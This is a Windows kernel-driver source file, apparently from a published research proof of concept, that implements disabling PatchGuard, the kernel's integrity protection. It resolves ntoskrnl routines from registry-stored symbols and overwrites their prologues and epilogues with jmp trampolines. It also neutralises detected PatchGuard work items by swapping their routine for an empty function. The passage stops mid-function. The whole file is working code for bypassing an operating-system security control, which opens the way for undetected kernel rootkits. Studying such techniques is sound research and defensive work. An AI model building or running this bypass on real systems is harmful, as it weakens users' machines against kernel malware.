// Copyright (c) 2015, tandasat. All rights reserved.
// Use of this source code is governed by a MIT-style license that can be
// found in the LICENSE file.

//
// This module implements disable PatchGuard functions.
//
#include "stdafx.h"
#include "dispg.h"
#include "log.h"
#include "asm.h"
#include "exclusivity.h"
#include "fnparse.h"
#include "util.h"

//
// N.B.
// In this module, a function pointer and an address the function are expressed
// differently by using FARPROC and UCHAR* respectively. It is important for
// ARM environment because an address to be called (i.e., a function pointer)
// should have LSB of 1 as opposed to the real address that is 4 byte-aligned
// on ARM. A symbol address is 4 byte-aligned address, so if you try to compare
// it with a function pointer, it will fail to match and end up with an error.
//
// Conversion between a function pointer and an address the function is done
// with UtilFpToData() and UtilDataToFp().
//

////////////////////////////////////////////////////////////////////////////////
//
// macro utilities
//

////////////////////////////////////////////////////////////////////////////////
//
// constants and macros
//

// Acceptable the minimum function epilogue size in bytes for inline hooking.
// The sizes are different between platforms because their trampoline codes are
// different. Refer to a TrampolineCode struct and a DispgpMakeTrampolineCode()
// function for the definition of trampoline codes.
#ifdef _AMD64_
static const ULONG DISPGP_MININUM_EPILOGUE_LENGTH = 14;
#else
static const ULONG DISPGP_MININUM_EPILOGUE_LENGTH = 8;
#endif

// Acceptable the minimum function epilogue size in bytes for inline hooking.
#ifdef _AMD64_
// It limits the length to 32 bytes due to a size of a backup area allocated by
// a macro NOP_32.
static const ULONG DISPGP_MAXIMUM_EPILOGUE_LENGTH = 32;
#else
// On ARM, the length of epilogue is expected to be exact 8 bytes.
static const ULONG DISPGP_MAXIMUM_EPILOGUE_LENGTH = 8;
#endif

////////////////////////////////////////////////////////////////////////////////
//
// types
//

// A symbol name, its value and a condition dictates when it needs to be solved.
struct SymbolSet {
  const wchar_t *SymbolName;
  UCHAR **Variable;
  bool (*IsRequired)();
};

// A structure used for an argument of the PatchGuardStaticWorkItem routine.
struct PatchGuardStaticWorkItemContext {
  ULONG_PTR EncodedWorkItemRoutine;
  ULONG_PTR EncodedWorkItemContext;
  ULONG_PTR XorKey;
};

// A basic PatchGuard context definition for validation.
struct PatchGuardContext {
  UCHAR Reserved[0xc8];
  FARPROC ExAcquireResourceSharedLite;
};
static_assert(sizeof(PatchGuardContext) == 0xc8 + sizeof(void *), "Size check");

// A structure reflects inline hook code.
#include <pshpack1.h>
struct TrampolineCode {
#ifdef _AMD64_
  UCHAR jmp[6];
#else
  UCHAR jmp[4];
#endif
  FARPROC FunctionAddress;
};
static_assert(sizeof(TrampolineCode) == DISPGP_MININUM_EPILOGUE_LENGTH,
              "Size check");
#include <poppack.h>

// Holds a necessary context for installing and uninstalling inline hook.
struct HookInfo {
  // A hook handler to be called instead
  FARPROC HookHandler;

  // An addresses to install inline hook
  UCHAR *HookAddresses[FNPARSEP_MAX_SUPPORTED_EPILOGUE_NUMBER];

  // A size of saved original code
  SIZE_T OriginalCodeSize;

  // A saved original code
  UCHAR OriginalCode[DISPGP_MAXIMUM_EPILOGUE_LENGTH];

  // Sizes in bytes to unwind to get return addresses from a stack pointers when
  // corresponding hook handlers are called.
  SIZE_T UnwindStackSize;
};

////////////////////////////////////////////////////////////////////////////////
//
// prototypes
//

EXTERN_C PVOID NTAPI RtlPcToFileHeader(_In_ PVOID PcValue,
                                       _Out_ PVOID *BaseOfImage);

EXTERN_C static void DispgpUninstallHooks();

EXTERN_C static void DispgpUninstallHooksUnsafe();

EXTERN_C static void DispgpUninstallHookUnsafe(_In_ const HookInfo &Info);

EXTERN_C static NTSTATUS DispgpInitializeGlobalVariables(
    _In_ const wchar_t *RegistryKey);

EXTERN_C static NTSTATUS DispgpInitializePatchGuardThreadRoutineRange(
    _In_ UCHAR *HintFunctionAddress);

EXTERN_C static NTSTATUS DispgpInitializeSelfEncryptAndWaitRoutineRange(
    _In_ UCHAR *HintFunctionAddress);

EXTERN_C static NTSTATUS DispgpSetEpilogueHookInfo(_In_ UCHAR *FunctionAddress,
                                                   _In_ FARPROC HookHandler,
                                                   _Out_ HookInfo *Info);

EXTERN_C static NTSTATUS DispgpFixupHookHandler(_In_ const HookInfo &Info);

EXTERN_C static NTSTATUS DispgpSetPrologueHookInfo(_In_ UCHAR *FunctionAddress,
                                                   _In_ FARPROC HookHandler,
                                                   _Out_ HookInfo *Info);

EXTERN_C static NTSTATUS DispgpInstallHook(_In_ const HookInfo &Info);

EXTERN_C static TrampolineCode DispgpMakeTrampolineCode(
    _In_ UCHAR *HookAddress, _In_ FARPROC HookHandler);

EXTERN_C static NTSTATUS DispgpHookDequeuingWorkItemRoutine();

EXTERN_C WORK_QUEUE_ITEM *DispgDequeuingWorkItemRoutineHookHandler(
    _Inout_ WORK_QUEUE_ITEM *WorkItem);

EXTERN_C static bool DispgpIsPatchGuardWorkItem(
    _In_ const WORK_QUEUE_ITEM *WorkItem);

EXTERN_C static NTSTATUS DispgpHookWaitRoutines();

EXTERN_C NTSTATUS DispgKeWaitForSingleObjectHookHandler(
    _In_ NTSTATUS OriginalReturnValue, _In_ ULONG_PTR StackPointer);

EXTERN_C NTSTATUS DispgKeDelayExecutionThreadHookHandler(
    _In_ NTSTATUS OriginalReturnValue, _In_ ULONG_PTR StackPointer);

EXTERN_C static void DispgpWaitRoutinesHookHandler(
    _Inout_ ULONG_PTR *AddressOfReturnAddress);

EXTERN_C static bool DispgpIsReturnningToPatchGuard(
    _In_ ULONG_PTR ReturnAddress);

EXTERN_C void DispgWaitForever();

EXTERN_C static NTSTATUS DispgpHookTinyPatchGuardDpcRoutine();

EXTERN_C static KDEFERRED_ROUTINE DispgpTinyPatchGuardDpcRoutineHookHandler;

////////////////////////////////////////////////////////////////////////////////
//
// variables
//

// True if PatchGuard has already been disarmed and an unhooking process is
// necessary when the driver is being unloaded.
static bool g_DispgpIsAlreadyDisarmed = false;

// A registry key name made up of symbol values.
static wchar_t g_DispgpRegistryKey[200] = {};

// An address of ExAcquireResourceSharedLite() function to determine if a given
// address is a PatchGuard context.
static FARPROC g_DispgpExAcquireResourceSharedLite = nullptr;

// Hook information for either KiCommitThreadWait() on x64 or
// KeRemovePriQueue() on ARM.
static HookInfo g_DispgpDequeueRoutineHookInfo = {};

// Hook information for wait functions.
static HookInfo g_DispgpKeWaitForSingleObjectHookInfo = {};
static HookInfo g_DispgpKeDelayExecutionThreadHookInfo = {};

// A range of a function which remains in an NTOSKRNL image and not in a pool
// like most of PatchGuard functions. This function named
// PatchGuardThreadRoutine is one initially called IndependentThreadContext by
// the author and executed when PsCreateSystemThread() is used as a scheduling
// method. It has a symbol on AMR and named CmpDelayFreeTMWorker().
static UCHAR *g_DispgpPatchGuardThreadRoutine = nullptr;
static UCHAR *g_DispgpPatchGuardThreadRoutineEnd = nullptr;

// A function used as a work item routine and remains in an NTOSKRNL image
// unlike most of PatchGuard functions that are copied into pool. It is either
// KiScbQueueScanWorker() on x64 or PopPdcSampleIdleTimeouts() on ARM.
static FARPROC g_DispgpPatchGuardStaticWorkItemRoutine = nullptr;

// A range of a function that calls one of wait routines from a PatchGuard
// context. It remains in an NTOSKRNL image, and thus, we need to check the
// return address of the wait routine is inside of this function as well.
static UCHAR *g_DispgpSelfEncryptAndWaitRoutine = nullptr;
static UCHAR *g_DispgpSelfEncryptAndWaitRoutineEnd = nullptr;

// Hook information for a DPC routine that checks integrity of a function
// selected at the boot time. It is either CcBcbProfiler() on x64 or
// CcDelayedFlushTimer() on ARM.
static HookInfo g_DispgpTinyPatchGuardDpcRoutineHookInfo = {};

////////////////////////////////////////////////////////////////////////////////
//
// implementations
//

ALLOC_TEXT(INIT, DispgInitialization)
_Use_decl_annotations_ EXTERN_C NTSTATUS
DispgInitialization(PUNICODE_STRING RegistryKey) {
  auto status = RtlStringCchPrintfW(g_DispgpRegistryKey,
                                    RTL_NUMBER_OF(g_DispgpRegistryKey), L"%wZ",
                                    RegistryKey);
  return status;
}

ALLOC_TEXT(PAGED, DispgTermination)
_Use_decl_annotations_ EXTERN_C void DispgTermination() {
  PAGED_CODE();

  DispgpUninstallHooks();
}

// Uninstall inline hooks with acquiring exclusivity. You should use
// DispgpUninstallHooksUnsafe() instead if you have already gained exclusivity.
_Use_decl_annotations_ EXTERN_C static void DispgpUninstallHooks() {
  if (!g_DispgpIsAlreadyDisarmed) {
    return;
  }

  auto exclusivity = std::experimental::make_unique_resource(
      ExclGainExclusivity(), &ExclReleaseExclusivity);

  // Ignore if ExclGainExclusivity() succeeded or not because this function
  // can not fail anyway. So let's move on regardless of that.
  if (!exclusivity) {
    LOG_WARN_SAFE("ExclGainExclusivity() failed. Attempting unsafe unhook.");
  }

  DispgpUninstallHooksUnsafe();
  exclusivity.reset();

  // Should have some time to make sure no one is running hook handlers.
  UtilSleep(1000);
}

// Uninstall inline hooks without exclusivity.
_Use_decl_annotations_ EXTERN_C static void DispgpUninstallHooksUnsafe() {
  DispgpUninstallHookUnsafe(g_DispgpTinyPatchGuardDpcRoutineHookInfo);
  DispgpUninstallHookUnsafe(g_DispgpKeDelayExecutionThreadHookInfo);
  DispgpUninstallHookUnsafe(g_DispgpKeWaitForSingleObjectHookInfo);
  DispgpUninstallHookUnsafe(g_DispgpDequeueRoutineHookInfo);
}

// Uninstall an inline hook without exclusivity.
_Use_decl_annotations_ EXTERN_C static void DispgpUninstallHookUnsafe(
    const HookInfo &Info) {
  for (auto hookAddress : Info.HookAddresses) {
    if (!hookAddress) {
      break;
    }
    UtilForceMemCpy(hookAddress, Info.OriginalCode, Info.OriginalCodeSize);
    UtilInvalidateInstructionCache(hookAddress, Info.OriginalCodeSize);
  }
}

// Disarm PatchGuard (i.g. installing inline hooks). It requires symbol
// information stored in the registry.
_Use_decl_annotations_ EXTERN_C NTSTATUS DispgDisablePatchGuard() {
  if (g_DispgpIsAlreadyDisarmed) {
    return STATUS_REQUEST_CANCELED;
  }

  // Initialize variables using symbol information.
  auto status = DispgpInitializeGlobalVariables(g_DispgpRegistryKey);
  if (!NT_SUCCESS(status)) {
    return status;
  }

  // Prepare for installing inline hooks.
  const auto exclusivity = std::experimental::make_unique_resource(
      ExclGainExclusivity(), &ExclReleaseExclusivity);
  if (!exclusivity) {
    status = STATUS_UNSUCCESSFUL;
    return status;
  }
  auto scopedDispgpUninstallHooksUnsafe =
      std::experimental::make_scope_exit(&DispgpUninstallHooksUnsafe);

  // Install hooks on DequeuingWorkItemRoutine, WaitRoutines and
  // TinyPatchGuardDpcRoutine.
  status = DispgpHookDequeuingWorkItemRoutine();
  if (!NT_SUCCESS(status)) {
    return status;
  }

  status = DispgpHookWaitRoutines();
  if (!NT_SUCCESS(status)) {
    return status;
  }

  status = DispgpHookTinyPatchGuardDpcRoutine();
  if (!NT_SUCCESS(status)) {
    return status;
  }

  // Done
  LOG_INFO("PatchGuard has been disabled.");
  scopedDispgpUninstallHooksUnsafe.release();
  g_DispgpIsAlreadyDisarmed = true;
  return status;
}

///////////////////////////////////////////////////////////////////////////////
//
// Disarming support routines
//
ALLOC_TEXT(PAGED, DispgpInitializeGlobalVariables)
_Use_decl_annotations_ EXTERN_C static NTSTATUS DispgpInitializeGlobalVariables(
    const wchar_t *RegistryKey) {
  PAGED_CODE();
  auto status = STATUS_UNSUCCESSFUL;

  UCHAR *pExAcquireResourceSharedLite = nullptr;
  UCHAR *pVerifierExAcquireResourceSharedLite = nullptr;
  UCHAR *pKeWaitForSingleObject = nullptr;
  UCHAR *pKeDelayExecutionThread = nullptr;

  UCHAR *pKiCommitThreadWait = nullptr;
  UCHAR *pKeRemovePriQueue = nullptr;

  UCHAR *pApiSetpSearchForApiSetHost = nullptr;
  UCHAR *pCmpDelayFreeTMWorker = nullptr;

  UCHAR *pKiScbQueueScanWorker = nullptr;
  UCHAR *pPopPdcSampleIdleTimeouts = nullptr;

  UCHAR *pCcBcbProfiler = nullptr;
  UCHAR *pCcDelayedFlushTimer = nullptr;

  // Define a list of required symbols, variables to save the value and
  // conditions to determine if it is needed or not.
  const auto always = []() { return true; };
  const auto ifX64 = []() { return IsX64(); };
  const auto ifARM = []() { return !IsX64(); };

  // clang-format off
  const SymbolSet requireSymbols[] = {
    {
      L"ntoskrnl!ExAcquireResourceSharedLite",
      &pExAcquireResourceSharedLite, always,
    },
    {
      L"ntoskrnl!VerifierExAcquireResourceSharedLite",
      &pVerifierExAcquireResourceSharedLite, always,
    },
    {
      L"ntoskrnl!KeWaitForSingleObject", 
      &pKeWaitForSingleObject, always,
    },
    {
      L"ntoskrnl!KeDelayExecutionThread", 
      &pKeDelayExecutionThread, always,
    },
    {
      L"ntoskrnl!KiCommitThreadWait", 
      &pKiCommitThreadWait, ifX64,
    },
    {
      L"ntoskrnl!KeRemovePriQueue", 
      &pKeRemovePriQueue, ifARM,
    },
    {
      L"ntoskrnl!ApiSetpSearchForApiSetHost", 
      &pApiSetpSearchForApiSetHost, ifX64,
    },
    {
      L"ntoskrnl!CmpDelayFreeTMWorker", 
      &pCmpDelayFreeTMWorker, ifARM,
    },
    {
      L"ntoskrnl!KiScbQueueScanWorker", 
      &pKiScbQueueScanWorker, ifX64,
    },
    {
      L"ntoskrnl!PopPdcSampleIdleTimeouts", 
      &pPopPdcSampleIdleTimeouts, ifARM,
    },
    {
      L"ntoskrnl!CcBcbProfiler", 
      &pCcBcbProfiler, ifX64,
    },
    {
      L"ntoskrnl!CcDelayedFlushTimer", 
      &pCcDelayedFlushTimer, ifARM,
    },
  };
  // clang-format on

  // Load each symbol from the registry if required
  for (auto &request : requireSymbols) {
    if (request.IsRequired()) {
      status =
          UtilLoadPointerVaule(RegistryKey, request.SymbolName,
                               reinterpret_cast<void **>(request.Variable));
      if (!NT_SUCCESS(status)) {
        LOG_ERROR("%ws not found", request.SymbolName);
        return status;
      }
      LOG_DEBUG("%p = %ws", *request.Variable, request.SymbolName);
    }
  }

  // Check if the symbol address is correct by comparing it with the real
  // value. pExAcquireResourceSharedLiteReal can be
  // VerifierExAcquireResourceSharedLite() when Driver Verifier is enabled.
  UNICODE_STRING procName = RTL_CONSTANT_STRING(L"ExAcquireResourceSharedLite");
  const auto pExAcquireResourceSharedLiteReal = UtilFpToData(
      reinterpret_cast<FARPROC>(MmGetSystemRoutineAddress(&procName)));
  LOG_DEBUG("ExAcquireResourceSharedLite (Symbol)   = %p",
            pExAcquireResourceSharedLite);
  LOG_DEBUG("ExAcquireResourceSharedLite (Real)     = %p",
            pExAcquireResourceSharedLiteReal);
  LOG_DEBUG("ExAcquireResourceSharedLite (Verifier) = %p",
            pVerifierExAcquireResourceSharedLite);
  if (!pExAcquireResourceSharedLite) {
    LOG_ERROR("Symbol information is not fresh.");
    return STATUS_DATA_NOT_ACCEPTED;
  }
  if (pExAcquireResourceSharedLiteReal != pExAcquireResourceSharedLite &&
      pExAcquireResourceSharedLiteReal !=
          pVerifierExAcquireResourceSharedLite) {
    LOG_ERROR("Symbol information is not fresh.");
    return STATUS_DATA_NOT_ACCEPTED;
  }

  // Even if Driver Verifier is enabled, PatchGuard is not affected and uses
  // ExAcquireResourceSharedLite, not VerifierExAcquireResourceSharedLite.
  g_DispgpExAcquireResourceSharedLite =
      UtilDataToFp(pExAcquireResourceSharedLite);

  // Initialization for PatchGuardThreadRoutine
  const auto pPatchGuardThreadRoutineHint =
      (IsX64() ? pApiSetpSearchForApiSetHost : pCmpDelayFreeTMWorker);
  status = DispgpInitializePatchGuardThreadRoutineRange(
      pPatchGuardThreadRoutineHint);
  if (!NT_SUCCESS(status)) {
    return status;
  }

  // Initialization for PatchGuardStaticWorkItemRoutine
  g_DispgpPatchGuardStaticWorkItemRoutine = UtilDataToFp(
      (IsX64() ? pKiScbQueueScanWorker : pPopPdcSampleIdleTimeouts));

  // Initialization for SelfEncryptAndWaitRoutine
  status = DispgpInitializeSelfEncryptAndWaitRoutineRange(
      UtilFpToData(g_DispgpPatchGuardStaticWorkItemRoutine));
  if (!NT_SUCCESS(status)) {
    return status;
  }

  // Initialization for DequeuingWorkItemRoutine
  const auto pDequeueRoutine =
      (IsX64() ? pKiCommitThreadWait : pKeRemovePriQueue);
  status = DispgpSetEpilogueHookInfo(
      pDequeueRoutine,
      reinterpret_cast<FARPROC>(AsmDequeuingWorkItemRoutineHookHandler),
      &g_DispgpDequeueRoutineHookInfo);
  if (!NT_SUCCESS(status)) {
    return status;
  }
  status = DispgpFixupHookHandler(g_DispgpDequeueRoutineHookInfo);
  if (!NT_SUCCESS(status)) {
    return status;
  }

  // Initialization for WaitRoutines
  status = DispgpSetEpilogueHookInfo(
      pKeWaitForSingleObject,
      reinterpret_cast<FARPROC>(AsmKeWaitForSingleObjectHookHandler),
      &g_DispgpKeWaitForSingleObjectHookInfo);
  if (!NT_SUCCESS(status)) {
    return status;
  }
  status = DispgpFixupHookHandler(g_DispgpKeWaitForSingleObjectHookInfo);
  if (!NT_SUCCESS(status)) {
    return status;
  }

  status = DispgpSetEpilogueHookInfo(
      pKeDelayExecutionThread,
      reinterpret_cast<FARPROC>(AsmKeDelayExecutionThreadHookHandler),
      &g_DispgpKeDelayExecutionThreadHookInfo);
  if (!NT_SUCCESS(status)) {
    return status;
  }
  status = DispgpFixupHookHandler(g_DispgpKeDelayExecutionThreadHookInfo);
  if (!NT_SUCCESS(status)) {
    return status;
  }

  // Initialization for TinyPatchGuardDpcRoutine
  const auto TinyPatchGuardDpcRoutine =
      (IsX64() ? pCcBcbProfiler : pCcDelayedFlushTimer);
  status = DispgpSetPrologueHookInfo(
      TinyPatchGuardDpcRoutine,
      reinterpret_cast<FARPROC>(DispgpTinyPatchGuardDpcRoutineHookHandler),
      &g_DispgpTinyPatchGuardDpcRoutineHookInfo);

  return status;
}

// Initialize g_DispgpPatchGuardThreadRoutine and -End.
ALLOC_TEXT(PAGED, DispgpInitializePatchGuardThreadRoutineRange)
_Use_decl_annotations_ EXTERN_C static NTSTATUS
DispgpInitializePatchGuardThreadRoutineRange(UCHAR *HintFunctionAddress) {
  PAGED_CODE();
  NT_ASSERT(HintFunctionAddress);

  UCHAR *pPatchGuardThreadRoutine = nullptr;
  if (IsX64()) {
    // On x64, PatchGuardThreadRoutine does not have a name, so we get its
    // address by getting a .pdata entry for a function followed by
    // PatchGuardThreadRoutine and incrementing it to consult
    // PatchGuardThreadRoutine's .pdata entry.
    UCHAR *base = nullptr;
    auto entry = FnparseLookupFunctionEntry(UtilDataToFp(HintFunctionAddress),
                                            reinterpret_cast<void **>(&base));
    if (!entry) {
      return STATUS_UNSUCCESSFUL;
    }
    entry++;  // Next entry
    pPatchGuardThreadRoutine =
        reinterpret_cast<UCHAR *>(entry->BeginAddress + base);
  } else {
    // On ARM, PatchGuardThreadRoutine has symbol information, so it can
    // directly be used.
    pPatchGuardThreadRoutine = HintFunctionAddress;
  }

  // Get a length of the function
  const auto length = FnparseGetFunctionLength(pPatchGuardThreadRoutine);
  LOG_DEBUG("Routine= %p, Length= %d", pPatchGuardThreadRoutine, length);
  if (!length) {
    return STATUS_UNSUCCESSFUL;
  }

  g_DispgpPatchGuardThreadRoutine = pPatchGuardThreadRoutine;
  g_DispgpPatchGuardThreadRoutineEnd = pPatchGuardThreadRoutine + length;
  LOG_DEBUG("DispgpPatchGuardThreadRoutine %p - %p",
            g_DispgpPatchGuardThreadRoutine,
            g_DispgpPatchGuardThreadRoutineEnd);
  return STATUS_SUCCESS;
}

// Initialize g_DispgpSelfEncryptAndWaitRoutine and -End.
ALLOC_TEXT(PAGED, DispgpInitializeSelfEncryptAndWaitRoutineRange)
_Use_decl_annotations_ EXTERN_C static NTSTATUS
DispgpInitializeSelfEncryptAndWaitRoutineRange(UCHAR *HintFunctionAddress) {
  PAGED_CODE();
  NT_ASSERT(HintFunctionAddress);

  // SelfEncryptAndWaitRoutine does not have a name, so we get its address
  // by getting a .pdata entry for a function followed by
  // SelfEncryptAndWaitRoutine and incrementing it to consult
  // SelfEncryptAndWaitRoutine's .pdata entry.
  UCHAR *base = nullptr;
  auto entry = FnparseLookupFunctionEntry(UtilDataToFp(HintFunctionAddress),
                                          reinterpret_cast<void **>(&base));
  if (!entry) {
    return STATUS_UNSUCCESSFUL;
  }
  entry++;  // Next entry
  auto pSelfEncryptAndWaitRoutine =
      reinterpret_cast<UCHAR *>(entry->BeginAddress + base);

  // Get a length of the function
  const auto length = FnparseGetFunctionLength(pSelfEncryptAndWaitRoutine);
  LOG_DEBUG("Routine= %p, Length= %d", pSelfEncryptAndWaitRoutine, length);
  if (!length) {
    return STATUS_UNSUCCESSFUL;
  }

  g_DispgpSelfEncryptAndWaitRoutine = pSelfEncryptAndWaitRoutine;
  g_DispgpSelfEncryptAndWaitRoutineEnd = pSelfEncryptAndWaitRoutine + length;
  LOG_DEBUG("DispgpSelfEncryptAndWaitRoutine %p - %p",
            g_DispgpSelfEncryptAndWaitRoutine,
            g_DispgpSelfEncryptAndWaitRoutineEnd);
  return STATUS_SUCCESS;
}

// Locates an address of function's epilogue and fill out HookInfo based on
// its information.
ALLOC_TEXT(PAGED, DispgpSetEpilogueHookInfo)
_Use_decl_annotations_ EXTERN_C static NTSTATUS DispgpSetEpilogueHookInfo(
    UCHAR *FunctionAddress, FARPROC HookHandler, HookInfo *Info) {
  PAGED_CODE();
  NT_ASSERT(FunctionAddress);
  NT_ASSERT(HookHandler);
  NT_ASSERT(Info);

  // Get a length and an address of the beginning of epilogue
  auto epilogueInfo = FnparseGetEpilogueInfo(FunctionAddress);
  if (!epilogueInfo.EpilogueLength) {
    return STATUS_UNSUCCESSFUL;
  }

#ifdef _ARM_
  //
  // On ARM, inline hook needs to be installed at one instruction before the
  // epilogue due to lack of spaces to install trampoline code. This location
  // is shown below:
  //
  //   MOV R0, x      ; Need to patch here (to keep 8 bytes).
  //   <epilogue>     ; This is where FnparseGetEpilogueAddress() returns.
  //
  // In order to do that, the epilogue address has to be subtracted by two,
  // which is a size of MOV R0, x, and the length of epilogue is needed to be
  // added two as well.
  //
  // This code assumes that the two bytes before the epilogue is MOV R0, x and
  // does not verify it. It is not as good as what it should be.
  //
  for (auto &epilogueAddress : epilogueInfo.EpilogueAddresses) {
    if (!epilogueAddress) {
      break;
    }
    epilogueAddress -= 2;
  }
  epilogueInfo.EpilogueLength += 2;
#endif

  if (epilogueInfo.EpilogueLength < DISPGP_MININUM_EPILOGUE_LENGTH ||
      epilogueInfo.EpilogueLength > DISPGP_MAXIMUM_EPILOGUE_LENGTH) {
    return STATUS_UNSUCCESSFUL;
  }

  // Only supports the exactly the same epilogue
  for (auto &epilogueAddress : epilogueInfo.EpilogueAddresses) {
    if (!epilogueAddress) {
      break;
    }
    if (memcmp(epilogueInfo.EpilogueAddresses[0], epilogueAddress,
               epilogueInfo.EpilogueLength) != 0) {
      LOG_ERROR("Unmatched epilogue code %p and %p",
                epilogueInfo.EpilogueAddresses[0], epilogueAddress);
      return STATUS_UNSUCCESSFUL;
    }
  }

  // Save information
  // It is safe to use the same length and original code as we have made sure
  // that all epilogues have the same code above
  Info->HookHandler = HookHandler;
  memcpy(Info->HookAddresses, epilogueInfo.EpilogueAddresses,
         sizeof(epilogueInfo.EpilogueAddresses));
  static_assert(
      sizeof(Info->HookAddresses) == sizeof(epilogueInfo.EpilogueAddresses),
      "Size check");
  Info->OriginalCodeSize = epilogueInfo.EpilogueLength;
  memcpy(Info->OriginalCode, Info->HookAddresses[0], Info->OriginalCodeSize);
  Info->UnwindStackSize = epilogueInfo.UnwindStackSize;
  return STATUS_SUCCESS;
}

// Copy saved original code into a hook handler.
ALLOC_TEXT(PAGED, DispgpFixupHookHandler)
_Use_decl_annotations_ EXTERN_C static NTSTATUS DispgpFixupHookHandler(
    const HookInfo &Info) {
  PAGED_CODE();

#ifdef _AMD64_
  // Locates where to copy original code, which is allocated by a NOP_32
  // macro.
  static const UCHAR NOP4[] = {
      0x90, 0x90, 0x90, 0x90,
  };
  auto fixupAddress = UtilMemMem(Info.HookHandler, 32, NOP4, sizeof(NOP4));
  if (!fixupAddress) {
    return STATUS_UNSUCCESSFUL;
  }

  // Copy epilogue.
  auto status =
      UtilForceMemCpy(fixupAddress, Info.OriginalCode, Info.OriginalCodeSize);
  if (!NT_SUCCESS(status)) {
    return status;
  }
  UtilInvalidateInstructionCache(fixupAddress, Info.OriginalCodeSize);

#else
  // Copy MOV R0, x (two bytes) and epilogue (six bytes). The
  // handler on ARM is in a READWRITE region.
  memcpy(UtilFpToData(Info.HookHandler), Info.OriginalCode, 2);
  memcpy(UtilFpToData(Info.HookHandler) + 8, Info.OriginalCode + 2, 6);
  UtilInvalidateInstructionCache(UtilFpToData(Info.HookHandler), 32);

#endif
  return STATUS_SUCCESS;
}

// Fill out HookInfo in order to hook the begging of the function. This is not
// designed to execute original code like what DispgpSetEpilogueHookInfo() does.
ALLOC_TEXT(PAGED, DispgpSetPrologueHookInfo)
_Use_decl_annotations_ EXTERN_C static NTSTATUS DispgpSetPrologueHookInfo(
    UCHAR *FunctionAddress, FARPROC HookHandler, HookInfo *Info) {
  PAGED_CODE();
  NT_ASSERT(FunctionAddress);
  NT_ASSERT(HookHandler);
  NT_ASSERT(Info);

  // Has one hook address as it is a prologue hook
  Info->HookHandler = HookHandler;
  Info->HookAddresses[0] = FunctionAddress;
  Info->OriginalCodeSize = DISPGP_MININUM_EPILOGUE_LENGTH;
  memcpy(Info->OriginalCode, Info->HookAddresses[0], Info->OriginalCodeSize);

  LOG_DEBUG("HookHandler= %p, HookAddress= %p, OriginalCodeSize= %d",
            Info->HookHandler, Info->HookAddresses[0], Info->OriginalCodeSize);

  return STATUS_SUCCESS;
}

// Install a inline hook (modify code) using HookInfo.
_Use_decl_annotations_ EXTERN_C static NTSTATUS DispgpInstallHook(
    const HookInfo &Info) {
  auto status = STATUS_UNSUCCESSFUL;
  for (auto hookAddress : Info.HookAddresses) {
    if (!hookAddress) {
      break;
    }
    LOG_DEBUG("Installing a hook %p => %p", hookAddress, Info.HookHandler);
    auto newCode = DispgpMakeTrampolineCode(hookAddress, Info.HookHandler);
    status = UtilForceMemCpy(hookAddress, newCode.jmp, sizeof(newCode));
    UtilInvalidateInstructionCache(hookAddress, sizeof(newCode));
    if (!NT_SUCCESS(status)) {
      break;
    }
  }
  return status;
}

// Build and return trampoline code.
_Use_decl_annotations_ EXTERN_C static TrampolineCode DispgpMakeTrampolineCode(
    UCHAR *HookAddress, FARPROC HookHandler) {
#ifdef _AMD64_

  //          jmp qword ptr [nextline]
  // nextline:
  //          dq HookHandler
  UNREFERENCED_PARAMETER(HookAddress);
  return {
      {
          0xff, 0x25, 0x00, 0x00, 0x00, 0x00,
      },
      HookHandler,
  };

#else

  //          LDR PC, =nextline
  // nextline DCD HookHandler
  if (reinterpret_cast<ULONG_PTR>(HookAddress) % 4) {
    return {
        {
            0xdf, 0xf8, 0x02, 0xf0,
        },
        HookHandler,
    };
  } else {
    return {
        {
            0xdf, 0xf8, 0x00, 0xf0,
        },
        HookHandler,
    };
  }

#endif
}

///////////////////////////////////////////////////////////////////////////////
//
// DequeuingWorkItemRoutine
//
_Use_decl_annotations_ EXTERN_C static NTSTATUS
DispgpHookDequeuingWorkItemRoutine() {
  LOG_INFO("Hooking DequeuingWorkItemRoutine...");
  return DispgpInstallHook(g_DispgpDequeueRoutineHookInfo);
}

// Check if the work item routine is PatchGuard's one, and overwrite it with
// an empty function when it is. This function must return its argument.
_Use_decl_annotations_ EXTERN_C WORK_QUEUE_ITEM *
DispgDequeuingWorkItemRoutineHookHandler(WORK_QUEUE_ITEM *WorkItem) {
  if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
    return WorkItem;
  }

  if (!DispgpIsPatchGuardWorkItem(WorkItem)) {
    return WorkItem;
  }

  LOG_INFO_SAFE("PatchGuard detected (calling %p).", WorkItem->WorkerRoutine);
#pragma warning(push)
#pragma warning(disable : 28023)
  WorkItem->WorkerRoutine = [](void *) {};  // NOLINT(readability/function)
#pragma warning(push)
  return WorkItem;
}

// Returns true if the work item routine is PatchGuard's one.
ALLOC_TEXT(PAGED, DispgpIsPatchGuardWorkItem)
_Use_decl_annotations_ EXTERN_C static bool DispgpIsPatchGuardWorkItem(
    const WORK_QUEUE_ITEM *WorkItem) {
  PAGED_CODE();

  // The thread should be a kernel thread because this function is intended
  // to handle a call from ExpWorkerThread().
  if (PsGetProcessId(PsGetCurrentProcess()) != reinterpret_cast<HANDLE>(4)) {
    return false;
  }

  // Work item's addresses should be in a kernel memory and accessible.
  if (WorkItem < MmSystemRangeStart || !UtilIsAccessibleAddress(WorkItem)) {
    return false;
  }
  if (WorkItem->WorkerRoutine < MmSystemRangeStart ||
      !UtilIsExecutableAddress(WorkItem->WorkerRoutine)) {
    return false;
  }
  if (WorkItem->Parameter < MmSystemRangeStart ||
      !UtilIsAccessibleAddress(WorkItem->Parameter)) {
    return false;
  }

  // Determine if it is inside of any image.
  UCHAR *base = nullptr;
  RtlPcToFileHeader(WorkItem->WorkerRoutine, reinterpret_cast<void **>(&base));
  LOG_DEBUG_SAFE("WorkRoutine = %p, Parameter = %p, Base = %p, Offset = %p",
                 WorkItem->WorkerRoutine, WorkItem->Parameter, base,
                 reinterpret_cast<UCHAR *>(WorkItem->WorkerRoutine) - base);

  PatchGuardContext *pgContext = nullptr;
  if (base) {
    // If it is inside of image, we need to check whether it is inside of
    // PatchGuardStaticWorkItemRoutine.
    if (reinterpret_cast<FARPROC>(WorkItem->WorkerRoutine) !=
        g_DispgpPatchGuardStaticWorkItemRoutine) {
      // If it is not neither, it is not PatchGuard's work item routine.
      return false;
    }

    // If it is, it is probably PatchGuard's one. If so, try to decrypt it
    // as it should be encrypted.
    LOG_DEBUG_SAFE("Calling PatchGuardStaticWorkItemRoutine %p",
                   WorkItem->WorkerRoutine);
    const auto context = reinterpret_cast<PatchGuardStaticWorkItemContext *>(
        WorkItem->Parameter);
    pgContext = reinterpret_cast<PatchGuardContext *>(
